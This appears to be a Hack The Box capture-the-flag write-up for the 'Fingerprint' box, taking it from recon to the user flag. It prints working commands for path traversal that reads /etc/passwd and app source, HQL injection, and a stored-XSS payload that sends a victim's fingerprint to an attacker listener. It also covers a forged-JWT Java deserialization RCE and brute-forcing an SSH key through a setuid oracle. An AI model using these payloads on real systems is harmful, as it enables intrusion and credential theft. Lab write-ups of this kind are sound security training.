---
title: "Fingerprint"
date: 2027-01-30 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, insane, path-traversal, hql-injection, xss, jwt, java-deserialization, setuid]
image:
    path: /assets/Images/fingerprint-001_foothold_user-flag.png
    alt: Fingerprint
description: "Fingerprint is an insane Linux box that chains two web apps: a Flask log viewer leaks its source (and JWT secret) via path traversal, while a GlassFish auth app falls to HQL injection plus a stored-XSS log-poison that steals a victim's browser fingerprint. With access, a hand-built Java deserialization gadget delivered in a forged JWT lands code execution, and a setuid regex binary is abused as an oracle to brute-force a user's SSH key. This post covers recon through the user flag."
---

## Overview

Fingerprint is an Insane-difficulty Linux machine built almost entirely around web vulnerabilities. The route to `user.txt` chains a Flask path traversal (leaking the app's secret key), an HQL injection plus stored XSS to bypass a fingerprint-based second factor, a custom Java deserialization gadget for code execution, and finally a setuid binary abused as a byte-by-byte file-read oracle to steal a user's SSH key. This post stops at the user flag.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | host login |
| 80   | Flask (Werkzeug) | "mylog" log manager, `/admin` + `/login` |
| 8080 | GlassFish | "secAUTH" biometric auth app |

```bash
nmap -p- --min-rate=1000 -T4 10.129.8.55
nmap -sC -sV -p22,80,8080 10.129.8.55
```

The landing page on :80 advertises a Flask + SQLite backend with default `admin:admin` creds, and gobuster surfaces `/admin` and a `CHANGELOG` (which mentions an Android app and a ModSecurity-like setup). Port 8080 is a separate Java auth app.

## Enumeration

The `/admin` page (reachable by ignoring the 302 redirect) views log files at `/admin/view/<file>`. The filename is used to build a path with no sanitisation — a classic path traversal:

```bash
curl --path-as-is "http://10.129.8.55/admin/view/../../../../../etc/passwd"
```

This reveals a `flask` user. Fuzzing for the app file under its home directory finds readable source, leaking the Flask secret key:

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u "http://10.129.8.55/admin/view/../../../../../home/flask/FUZZ/app.py" --hh 18
curl --path-as-is "http://10.129.8.55/admin/view/../../../../../home/flask/app/app.py"
# app.config['SECRET_KEY'] = '<redacted>'
```

## Foothold

The :8080 login takes `uid` + a browser `fingerprint`. The `uid` field is **HQL injectable** (Hibernate's query language) — a single quote 500s, and `' or username<>'admin` bypasses the username check. But a valid fingerprint is still required.

The username field is also **stored-XSS** — login attempts are logged and rendered (unescaped) by an automated admin viewing the logs on :80. Inject a payload that computes and exfiltrates that bot's fingerprint:

```bash
curl "http://10.129.8.55:8080/login" \
  --data-urlencode 'uid=<script src="http://10.129.8.55:8080/resources/js/login.js"></script><script>document.write("<img src=http://<lhost>:9000/"+getFingerPrintID()+">")</script>' \
  --data-urlencode auth_primary=a --data-urlencode auth_secondary=a
# listener on :9000 receives the bot's fingerprint hash
```

Authenticate as the non-admin user with the stolen fingerprint, which yields a session JWT (HS256, signed with the leaked secret) and an avatar upload:

```bash
curl -i "http://10.129.8.55:8080/login" --data-urlencode "uid=' or username<>'admin" --data-urlencode auth_primary=a --data-urlencode auth_secondary=<fingerprint> -c jar.txt
```

`/backups` leaks the app's Java source (`User.java`, `Profile.java`, `UserProfileStorage.java`) — and `UserProfileStorage.readObject()` builds a shell command from an attacker-controlled username. Build a gadget from those exact classes (plain `javac`, matching `serialVersionUID`), upload an admin `profile.ser`, then forge a JWT whose `user` claim carries a serialized object with a command-injecting username:

```bash
javac --release 8 com/admin/security/src/model/*.java com/admin/security/src/profile/*.java App.java && java App > ups_b64.txt
curl -b "user=<jwt>" -F "avatar=@profile.ser;filename=profile.ser" http://10.129.8.55:8080/upload
python3 -c "import jwt;print(jwt.encode({'user':open('ups_b64.txt').read().strip()},'<secret>','HS256'))"
curl -b "user=<forged_jwt>" http://10.129.8.55:8080/welcome   # deserialization -> RCE as www-data
```

As `www-data`, a setuid binary `cmatch` (owned by `john`) regex-matches files and reports only the match count — a byte-by-byte oracle. Brute john's SSH key character by character, recover the key's passphrase from a decompiled `.war`, and SSH in:

```bash
# loop: cmatch /home/john/.ssh/id_rsa "^${known}${c}" ; keep char while match count != 0 (newline as regex token \n)
ssh-keygen -p -P '<passphrase>' -N '' -f john_id_rsa
ssh -i john_id_rsa john@10.129.8.55
```

![Fingerprint user flag](/assets/Images/fingerprint-001_foothold_user-flag.png)

## User flag

```bash
cat /home/john/user.txt   # HTB{...}
```

Access as `john` achieved — `user.txt` captured (value redacted).

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
